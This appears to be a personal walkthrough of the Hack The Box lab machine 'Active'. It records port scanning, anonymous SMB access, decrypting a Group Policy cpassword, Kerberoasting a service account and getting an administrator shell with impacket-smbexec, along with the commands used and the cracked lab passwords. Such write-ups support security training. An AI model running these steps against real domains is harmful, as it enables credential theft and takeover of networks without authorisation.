# NMAP TCP

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.20.79  -max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 15:10 -0400
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.01% done; ETC: 15:12 (0:01:38 remaining)
Warning: 10.129.20.79 giving up on port because retransmission cap hit (1).
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 18.18% done; ETC: 15:12 (0:00:18 remaining)
Nmap scan report for 10.129.20.79
Host is up (0.044s latency).
Not shown: 65093 closed tcp ports (reset), 420 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 19:11:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-04T19:12:54
|_  start_date: 2026-04-04T19:09:33
|_clock-skew: 5s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.27 seconds
```

# SMB

SMB Null Bind allowed

smbclient shows shares:

```
└─$ smbclient -N -L ////10.129.20.79                      
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.20.79 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Replication and Users are two servers that are unusual here

Users is behind auth

Replication is freely accessible:
```
┌──(xmen㉿kali)-[~]
└─$ smbclient -N //10.129.20.79/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 247284 blocks available
```

Found Groups.xml:

```
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

in `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` on the replication share

This appears to have a password hash in it for `active.htb\SVC_TGS`

According to this article on Active Directory security https://adsecurity.org/?p=2288

The AES key used to encrypt and give this cyphertext is:

```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```

Able to get the cpassword decrypted using:

```
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/gpp-decrypt]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Found User:

active.htb\SVC_TGS
GPPstillStandingStrong2k18

# SMB Share Users

Able to use the SVC_TGS account to login on SMB share Users and get user.txt

This share is just the c:\Users directory with a SVC_TGS folder for our user

# Priv Esc

Able to use the credentials of SVC_TGS as ldap credentials to get the SPNs for service accounts using impacket-GetUserSPNs

This allows for Kerebroasting the active/CIFS service user

Found password via kerebroasting through rockyou wordlist with John:

```
Ticketmaster1968
```


Able to get shell via impacket SMBExec

```
┌──(xmen㉿kali)-[~]
└─$ impacket-smbexec active.htb/Administrator:Ticketmaster1968@active.htb
```

